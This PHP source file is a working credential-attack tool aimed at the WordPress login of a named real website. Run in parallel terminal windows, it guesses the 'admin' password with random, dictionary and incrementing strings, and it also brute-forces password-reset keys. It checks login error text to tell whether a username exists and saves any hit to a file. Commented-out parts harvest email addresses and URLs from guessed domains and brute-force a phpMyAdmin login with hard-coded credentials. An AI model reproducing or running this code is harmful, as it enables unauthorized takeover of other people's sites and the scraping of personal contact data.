<?php 

require ("utils.php");

$password = ["a","fjskdksj","freedom","sex","GOD","time","wisdom"];
// function callback($result){
// 	global $password;
// 	$r=end($result);
// 	$arr=[
// 			[$r],
// 			["",".","@","-","#","*","(",")","="],
// 			["","1","12","123","1234"]
// 		];
// 	$arr=[
// 			['http://',"https://"],
// 			[$r],
// 			['.com',".net",".co.uk",".ng",".org",".info"]
// 		];
// 	$a=matrix_possible($arr);
// 	foreach ($a as $key => $value) {
// 		$html=get_file($value);
// 		if($html){
// 			// write_to_file("/database/emails.txt","");
// 			// write_to_file("/database/websites.txt","");
// 			// echo $html;
// 			$regex = "/([\_a-z0-9\-]+(\.[\_a-z0-9-]+)*\@[a-z0-9\-]+(\.[a-z0-9\-]+)*\.[a-z]{2,9})/i";
// 			$regex2="/((http|https|ftp|ftps)\:\/\/[a-z0-9\-]+(\.[a-z0-9\-]+)*\:?([0-9]{0,5})?\/?([a-z0-9\-\_\=\$\&\%\!\#\?\\\/\(\)\[\]\{\}\@]*))/i";
// 			preg_match_all($regex, $html, $matches);
// 			preg_match_all($regex2, $html, $matches2);
// 			print_r($matches[0]);
// 			print_r($matches2[0]);
// 			if($matches[0]){
// 				foreach ($matches[0] as $value) {
// 					# code...
// 					write_to_file("../database/emails.txt",$value);
// 				}
// 			}
// 			if($matches2[0]){
// 				foreach ($matches2[0] as $value) {
// 					# code...
// 					write_to_file("../database/websites.txt",$value);
// 				}
// 			}
// 		}
// 		# code...
// 	}
// 	// echo implode("<br/>",$result);
// }
// gena(1,'callback');
// $dictionary=get_json("../database/words_dictionary.json");
// function callback($result){
// 	global $dictionary;
// 	if(property_exists($dictionary,$result)){
// 		print("$result {".md5($result)."} found in database\r\n");
// 		sleep(10);
// 	}else{
// 		print($result."\r\n");
// 	}
// }
// key_dictionary(6,'callback',"9a");

// $browser=new FakeBrowser();
// $browser->setURL("http://localhost/phpMyAdmin/index.php");
// echo $browser->getURL()."\r\n";
// $browser->setBrowserMethod("GET");
// function callback($res){
// 	global $browser;
// 	// print_r($res);
// 	preg_match('/name\=\"server\" value="([^\"]*)"/i', $res['text'], $server);
// 	preg_match('/name\=\"token\" value="([^\"]*)"/i', $res['text'], $token);
// 	preg_match('/name\=\"set_session\" value="([^\"]*)"/i', $res['text'], $set_session);
// 	print_r($server);
// 	print_r($token);
// 	print_r($set_session);
// 	$browser->setBrowserHost("localhost");
// 	$browser->setBrowserMethod("POST");
// 	$browser->setBrowserCookies(["phpMyAdmin"=>$set_session[1]]);
// 	$browser->setBrowserContent(
// 		[
// 			"set_session"=>$set_session[1],
// 			"token"=>$token[1],
// 			"pma_username"=>"michael",
// 			"pma_password"=>"familymustgrow",
// 			"server"=>$server[1],
// 			"target"=>"index.php"
// 		]
// 	);
// 	function callback2($res){
// 		preg_match('/<div id\=\"pma_errors\">(.*)<\/div>/i',$res['text'],$pma_errors);
// 		if(count($pma_errors)>0)
// 			print_r($pma_errors);
// 		else
// 			print_r($res);
// 	}
// 	$browser->run('callback2');
// };
// if(true){
// 	exec("vlc ../audio/audio.mp3");
// }
// $browser->run('callback');
// print_r($browser->getBrowser("http"));
// print_r($browser->getResponse());










$shortcuts="d::s::";
$options = getopt($shortcuts);



if(!empty($options) and count($options)>0){
	$GLOBALS['JOB'] = true;
	$gen=1;
	// $possible=12312;
	$possible=270386457437;
	$average=5.04;
	$totalwait=(($possible*$average)/60)/60;
	$timestart=microtime(true);
	$datestarted=date("Y-m-d, H:i:sa",$timestart);
	print("Job started at ".$datestarted."\r\n");
	print("Job will take $totalwait Hours to end \r\n");
	function callback($res){
		global $formData,$browser;
		$login_error=1;
		// $Doc= new DOMDocument();
		// $Doc->loadHTML($res['text']);
		// echo $Doc->saveHTML();
		// $xml=@simplexml_load_string($res['text']);
		// print_r($browser->getBrowser("http:header"));
		preg_match("/\<div id\=\"login_error\"\>(.*)(\<\/div\>)?/i", $res['text'],$xml);
		if(count($xml)>0){
			if(preg_match("/ERROR/i",$xml[1]) and preg_match("/Invalid username/i",$xml[1])){
				$login_error=1;
				print("INVALID USERNAME\r\n");
			}else{
				$login_error=1;
				print("USERNAME VALID\r\n");
			}
		}else{
			$login_error=1;
		}


		foreach ($res['header'] as $head) {
				# code...
			if(preg_match("/Set-Cookie: wordpress_[^test_cookie]/i", $head)){
				$login_error=0;
			}
		}

		if($login_error>0){
			print_r($formData);
			print_r($res['header']);	
		}
		else{
			print_r($formData);

			print_r($res['status']."\r\n");
			global $timestart;
			$timeend=microtime(true);
			$timediff=$timeend-$timestart;
			$dateended=date("Y-m-d, H:i:sa",$timeend);
			write_to_file("../database/passwordreset.key",$browser->getURL()." log={$formData['log']} key={$formData['pwd']}");
			print("Job ended at ".$dateended."\r\n");
			print("Job took ".$timediff." seconds \r\n");
			exec("vlc ../audio/audio.mp3");
			$GLOBALS['JOB']=false;
		}
		global $loopstart;
		$loopend=microtime(true);
		$loopdiff=$loopend-$loopstart;
		print("Job took ".$loopdiff." seconds \r\n");
	};
	$browser=new FakeBrowser();
	$browser->setURL("https://www.shixels.com/wp-login.php");
	echo $browser->getURL()."\r\n";
	$browser->setBrowserMethod("POST");
	$browser->setBrowserHost("www.shixels.com");
	$browser->setBrowserConnection("keep-alive");
	$browser->setBrowserCookies(["wordpress_test_cookie=WP+Cookie+check;"]);
	$formData=[
		"testcookie"=>1,
		"log"=>"admin",
		"pwd"=>"",
		"rememberme"=>"forever",
		"wp-submit"=> "Log In",
		"redirect_to"=>"https://www.shixels.com/wp-admin"
	];
	if($options['d']=="random"){
		// use random genpassword
		print("Using Random Strings\r\n");
		while($GLOBALS['JOB']){
			print("Try $gen of $possible\r\n");
			$loopstart=microtime(true);
			$formData['pwd']=wp_generate_password(18);
			$browser->setBrowserContent($formData);
			$browser->run('callback');
			$gen++;
		}
	}
	elseif($options['d']=="database"){
		// use database
		print("Using Database Strings\r\n");
		$database = get_json("../database/words_dictionary.json");
		foreach ($database as $key => $value) {
			# code...
			if($GLOBALS['JOB']){
				print("Try $gen of $possible\r\n");
				$loopstart=microtime(true);
				$formData['pwd']=$key;
				$browser->setBrowserContent($formData);
				$browser->run('callback');
				$gen++;
			}
		}
		print("Not Found in Database Strings\r\n");
	}
	elseif($options['d']=="charincrement"){
		print("Using Character Increment Strings\r\n");
		if(isset($options['s'])){
			$words=$options['s'];
			print("With String ".$words."\r\n");
		}else{
			$words='';
		}
		// use gen strings increment value
		while($GLOBALS['JOB']) { 
			# code...
			if($gen>1)
				$words=chars_increment($words);
			print("Try $gen of $possible\r\n");
			$loopstart=microtime(true);
			$formData['pwd']=$words;
			$browser->setBrowserContent($formData);
			$browser->run('callback');
			$gen++;
		}
	}elseif($options['d']=="forcepasswordreset"){
		while($GLOBALS['JOB']) { 
			print("Try $gen of $possible\r\n");
			if(isset($options['s']) and $options['s']!==false){
				$sea=explode(":", $options['s']);
				// xDvkZZHPEOVCTiEFobl8
				if(count($sea)>1){
					$key=$sea[0];
					$login=$sea[0];
				}
				if(count($sea)>0){
					$key=$sea[0];
					$login="admin";
				}
				else{
					$key=wp_generate_password( 20, false );
					$login="admin";
				}
			}else{
				$key=wp_generate_password( 20, false );
				$login="admin";
			}
			$loopstart=microtime(true);
			$browser->setURL("https://www.shixels.com/wp-login.php?action=rp&key=$key&login=$login");
			echo $browser->getURL()."\r\n";
			$browser->setBrowserMethod("GET");
			$browser->setBrowserHost("www.shixels.com");
			$browser->setBrowserConnection("keep-alive");
			$browser->setBrowserCookies(["wordpress_test_cookie=WP+Cookie+check;"]);
			$browser->run(function($res){
				global $key,$options,$browser;
				print_r($browser->getBrowser("http:header"));
				print_r($res['header']);
				$browser->setURL("https://www.shixels.com/wp-login.php?action=rp");
				echo $browser->getURL()."\r\n";
				$browser->setBrowserMethod("GET");
				$browser->setBrowserHost("www.shixels.com");
				$browser->setBrowserConnection("keep-alive");
				$browser->clearCookiesjar();
				$browser->setBrowserCookies(["wordpress_test_cookie=WP+Cookie+check;"]);
				$setCookie=$browser->getSet_Cookie($res['header']);
				$browser->setBrowserCookies($setCookie);
				$browser->run(function($res2){
					global $browser,$key;
					print_r($browser->getBrowser("http:header"));
					print_r($res2['header']);
					// $key=="xDvkZZHPEOVCTiEFobl8"
					if($res2['status']=="HTTP/1.1 200 OK"){
						global $timestart;
						$timeend=microtime(true);
						$timediff=$timeend-$timestart;
						$dateended=date("Y-m-d, H:i:sa",$timeend);
						print("Job ended at ".$dateended."\r\n");
						print("Job took ".$timediff." seconds \r\n");
						write_to_file("../database/passwordreset.key",$browser->getURL()." key=".$key);
						exec("vlc ../audio/audio.mp3");
						$GLOBALS['JOB']=false;
					}else{
						print("Key not Matched\r\n");
					}
				});
				// var_dump($browser->getCookie());
				// var_dump($browser->getBrowser("http:header"));
				// var_dump($browser->getCookie());
				// var_dump();
				// var_dump($browser->getCookie());
				global $loopstart;
				$loopend=microtime(true);
				$loopdiff=$loopend-$loopstart;
				print("Job took ".$loopdiff." seconds \r\n");
				if(isset($options['s'])){
					$GLOBALS['JOB']=false;
				}
				print($res['status']."\r\n");
			});
			$gen++;
		}
	}
	elseif($options['d']=="callpr"){
		foreach (range("A","D") as $valtoa){
			exec('gnome-terminal -e "php action.php -dforcepasswordreset"');
		}
		exec('gnome-terminal -e "php action.php -dpasswordresetinc"');
		foreach (range("A","D") as $valtoa){
			exec('gnome-terminal -e "php action.php -dpasswordresetinc -s'.$valtoa.'"');
		}
	}
	elseif($options['d']=="passwordresetinc"){
		while($GLOBALS['JOB']) { 
			print("Try $gen of $possible\r\n");
			$loopstart=microtime(true);
			$word=@get_file("../database/increment{$options['s']}.txt","last");
			echo $word."\n";
			
			if($word!='')
				$key=increment($word);
			elseif(isset($options['s']))
				$key=wp_generate_password( 20, false );
			else
				$key=increment("aaaaaaaaaaaaaaaaaaaaa");
			$login="admin";
			$browser->setURL("https://www.shixels.com/wp-login.php?action=rp&key=$key&login=$login");
			echo $browser->getURL()."\r\n";
			$browser->setBrowserMethod("GET");
			$browser->setBrowserHost("www.shixels.com");
			$browser->setBrowserConnection("keep-alive");
			$browser->setBrowserCookies(["wordpress_test_cookie=WP+Cookie+check;"]);
			$browser->run(function($res){
				global $key,$options,$browser;
				var_dump($browser->getBrowser("http:header"));
				var_dump($res['header']);
				$browser->setURL("https://www.shixels.com/wp-login.php?action=rp");
				echo $browser->getURL()."\r\n";
				$browser->setBrowserMethod("GET");
				$browser->setBrowserHost("www.shixels.com");
				$browser->setBrowserConnection("keep-alive");
				$browser->clearCookiesjar();
				$browser->setBrowserCookies(["wordpress_test_cookie=WP+Cookie+check;"]);
				$setCookie=$browser->getSet_Cookie($res['header']);
				$browser->setBrowserCookies($setCookie);
				$browser->run(function($res2){
					global $browser,$key;
					var_dump($browser->getBrowser("http:header"));
					var_dump($res2['header']);
					// $key=="xDvkZZHPEOVCTiEFobl8"
					if($res2['status']=="HTTP/1.1 200 OK"){
						global $timestart;
						$timeend=microtime(true);
						$timediff=$timeend-$timestart;
						$dateended=date("Y-m-d, H:i:sa",$timeend);
						print("Job ended at ".$dateended."\r\n");
						print("Job took ".$timediff." seconds \r\n");
						write_to_file("../database/passwordreset.key",$browser->getURL()." key=".$key);
						exec("vlc ../audio/audio.mp3");
						$GLOBALS['JOB']=false;
					}else{
						print("Key not Matched\r\n");
					}
				});
			});
			global $loopstart;
			$loopend=microtime(true);
			$loopdiff=$loopend-$loopstart;
			@write_to_file("../database/increment{$options['s']}.txt",$key,true);
			print("Job took ".$loopdiff." seconds \r\n");
			$gen++;
		}
	}
	else{
		var_dump($options);
	}
}
elseif (!empty($options)) {
	# code...
	print("i will call my self\r\n");
	exec('gnome-terminal -e "php action.php -drandom"');
	exec('gnome-terminal -e "php action.php -ddatabase"');
	// exec('gnome-terminal -e "php action.php -dcharincrement"');
	exec('gnome-terminal -e "php action.php -dcharincrement -s\'aaaaaaaaaaaaaaaaaa\'"');
	/* 
	*this is best for random and unknown buffer it the safest bootforce method use 20-42 not morethan
	*but i will be using 4
	*/
	for($t=0;$t<4;$t++){
		exec('gnome-terminal -e "php action.php -drandom"');
	}
	/* 
	*this is best for random and unknown buffer it the safest bootforce method use 20-42 not morethan
	*but i will be using 4
	*/
	for($t=0;$t<4;$t++){
		exec('gnome-terminal -e "php action.php -dcharincrement -s\''.wp_generate_password(18).'\'"');
	}
	// this takes less memory it safe to use
	// for($t=0;$t<72;$t++){
	// 	exec('gnome-terminal -e "php action.php -dcharincrement -s\''.$chars[$t].'aaaaaaaaaaaaaaaaa\'"');
	// }
	// this takes much memory not so recommended
	// foreach (str_split("!@#$%^&*()") as $value) {
	// 	# code...
	// 	for($s=0;$s<18;$s++){
	// 		$strin=str_repeat($chars[0], 18);
	// 		$strin[$s]=$value;
	// 		print("With String ".$strin."\r\n");
	// 		exec('gnome-terminal -e "php action.php -dcharincrement -s\''.$strin.'\'"');
	// 	}
	// }
	// this is not safe take all memory so not recommended
	// for($l=0;$l<18;$l++){
	// 	for($t=0;$t<72;$t++){
	// 		for($s=0;$s<18;$s++){
	// 			$strin=str_repeat($chars[0], 18);
	// 			$strin[$s]=$chars[$t];
	// 			print("With String ".$strin."\r\n");
	// 			exec('gnome-terminal -e "php action.php -dcharincrement -s\''.$strin.'\'"');
	// 		}
			
	// 	}
	// }
}else{
	exec('php action.php -dforcepasswordreset');
}


// password q@yW1UusaRnPi@q6rn
// ttRa0JWMGK^*yCF0U$
// qpQjI0CD1B*iYeUrFf
// PtmseG*e&UEqu*hqtO
// url http://localhost/wordpress/wp-login.php
// echo wp_generate_password(18)."\r\n";
?>